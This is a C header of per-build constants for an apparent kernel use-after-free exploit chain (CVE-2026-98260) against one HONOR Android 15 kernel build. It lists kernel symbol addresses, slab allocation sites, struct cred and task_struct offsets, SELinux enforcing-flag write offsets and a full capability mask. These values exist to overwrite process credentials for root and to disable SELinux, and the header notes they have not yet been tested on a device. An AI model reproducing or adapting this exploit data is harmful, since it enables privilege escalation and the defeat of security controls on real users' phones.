/* pc98260_target_g893.h — CVE-2026-98260 per-build constants.
 *
 * Target: HONOR 6.6.118 build g893e848657cc (Android 15 base)
 *   kernel_release = 6.6.118-android15-8-g893e848657cc-4k
 *   4K pages, VA_BITS=39, Qualcomm "sun" (SM8750), KMI android15-8
 *
 * Derived from (all offline, no device access):
 *   - boot_ota_1794139884130.img
 *     sha256 fea0621288c95b7d003b7897d066f4d2f94bd21c596d6426dd5dd3714302cb7d
 *   - embedded gzip kernel sha256
 *     81dcc9c0c74033795f1ab3fe5aebb140893f9f750c3cfd38e32d710c8fae5466
 *   - arm64 Image sha256
 *     7f3d439d9f0ce0affb6c8e1d8aa72e768177edb7b3b4710e6aee8f0cdd609b24
 *   - kallsyms/BTF parsed locally by KernelProfileGenerator and
 *     vmlinux-to-elf; LINK_ALLOC_TIMER/LINK_ALLOC_CRED verified by
 *     llvm-objdump (do_timer_create+0xa8, prepare_creds+0x24).
 *
 * Status: STATIC DERIVATION ONLY — no device with this exact build has
 * run the 98260 chain yet.  GEO_TASK_OBJSIZE is a seed: uaf_plant
 * overrides it from /proc/slabinfo at runtime.
 */
#ifndef PC98260_TARGET_G893_H
#define PC98260_TARGET_G893_H

#include <stdint.h>

#define TARGET_NAME          "honor-66118-g893"
#define TARGET_KERNEL        "6.6.118-android15-8-g893e848657cc-4k"
#define TARGET_KERNEL_SHA256 "7f3d439d9f0ce0affb6c8e1d8aa72e768177edb7b3b4710e6aee8f0cdd609b24" /* arm64 Image sha256 */

/* ---- absolute addresses (link-time; add g_slide at runtime) ---------- */
#define LINK_SELINUX_STATE   UINT64_C(0xffffffc08218f048)  /* selinux_state */
#define LINK_INIT_USER_NS    UINT64_C(0xffffffc081f4e0e0)  /* init_user_ns */
#define LINK_ROOT_USER       UINT64_C(0xffffffc081f4e370)  /* root_user    */
#define LINK_INIT_GROUPS     UINT64_C(0xffffffc081f4f8d0)  /* init_groups  */
#define LINK_INIT_UCOUNTS    UINT64_C(0xffffffc081f4fe40)  /* init_ucounts */

/* ---- kprobe/tracepoint call sites (function-internal; NOT portable) ---
 * node[0] of the address is the instruction right after
 * `bl kmem_cache_alloc*`; the kmem tracepoint records exactly this value.
 */
#define LINK_ALLOC_TIMER     UINT64_C(0xffffffc080197278)  /* do_timer_create+0xa8 (posix_timers_cache) */
#define LINK_ALLOC_CRED      UINT64_C(0xffffffc0800e565c)  /* prepare_creds+0x24 (cred_jar) */
#define LINK_ALLOC_TASK      UINT64_C(0xffffffc0800ac848)  /* copy_process+0x140 (task_struct_cachep, reference only) */

/* ---- struct geometry (6.6.118 .BTF, byte offsets) ---- */
#define GEO_TASK_CRED        0x820   /* task_struct.cred          */
#define GEO_TASK_REAL_CRED   0x818   /* task_struct.real_cred     */
#define GEO_TASK_COMM        0x830   /* task_struct.comm          */
#define GEO_KITIMER_IT       0x78    /* k_itimer.it (cpu_timer.node) */
#define GEO_KITIMER_SIZE     0x108   /* sizeof(k_itimer) = 264    */
#define GEO_KITIMER_STRIDE   0x108   /* posix_timers_cache object */
#define GEO_CRED_SIZE        184     /* sizeof(struct cred)       */
#define GEO_CRED_ALLOC_SIZE  192     /* cred_jar cache object size (bytes_alloc) */
#define GEO_CRED_UID         0x8
#define GEO_CRED_GID         0xc
#define GEO_CRED_SUID        0x10
#define GEO_CRED_SGID        0x14
#define GEO_CRED_EUID        0x18
#define GEO_CRED_EGID        0x1c
#define GEO_CRED_FSUID       0x20
#define GEO_CRED_FSGID       0x24
#define GEO_CRED_CAP_INH     0x30
#define GEO_CRED_CAP_PERM    0x38
#define GEO_CRED_CAP_EFF     0x40
#define GEO_CRED_CAP_BSET    0x48
#define GEO_CRED_CAP_AMB     0x50
#define GEO_CRED_SECURITY    0x80
#define GEO_CRED_USER        0x88
#define GEO_CRED_USER_NS     0x90
#define GEO_CRED_UCOUNTS     0x98
#define GEO_CRED_GROUP_INFO  0xa0
#define GEO_SELINUX_ENFORCE  0
#define GEO_SELINUX_INIT     1
#define GEO_SELINUX_WRITE    (-7)   /* clear 7 bytes + enforcing */
#define GEO_SELINUX_SIZE     0x80

/* ---- slab geometry (live /proc/slabinfo) ---------------------------- */
#define GEO_TASK_OBJSIZE            4800  /* seed: sizeof(task_struct)=0x12c0; verify live */
#define GEO_TASK_OBJ_PER_SLAB       0
#define GEO_TASK_SLAB_PAGES         0
#define GEO_POSIX_TIMER_OBJSIZE     264
#define GEO_POSIX_TIMER_OBJ_PER_SLAB 31
#define GEO_POSIX_TIMER_SLAB_ORDER  1     /* 2 pages = 8192 bytes             */
#define GEO_PAGE_SIZE               4096
#define GEO_FRAG_PAGE_SIZE          8192  /* posix_timers_cache slab          */

/* ---- kernel addressing ---------------------------------------------- */
#define GEOM_PAGE_OFFSET     UINT64_C(0xffffff8000000000)
#define GEOM_VA_BITS         39
#define GEOM_MEMSTART_PFN    UINT64_C(0x80000) /* verify on device (/proc/iomem) */
#define GEOM_MEMSTART_ADDR   UINT64_C(0xffffffc08174db48) /* memstart_addr symbol */

/* ---- privilege bitmask ---------------------------------------------- */
#define CAP_FULL             UINT64_C(0x1ffffffffff) /* cap_last_cap=40 */

/* ---- begin_new_exec cleanup offsets (reference only) ---------------- */
#define BNE_LINK              UINT64_C(0xffffffc0803d4fc4) /* begin_new_exec */
#define BNE_RELEASE_TASK_OFF  0x34c  /* bl release_task           */
#define BNE_TIMERS_EXIT_OFF   0x41c  /* bl posix_cpu_timers_exit  */
#define BNE_EXIT_ITIMERS_OFF  0x42c  /* bl exit_itimers           */

#endif /* PC98260_TARGET_G893_H */
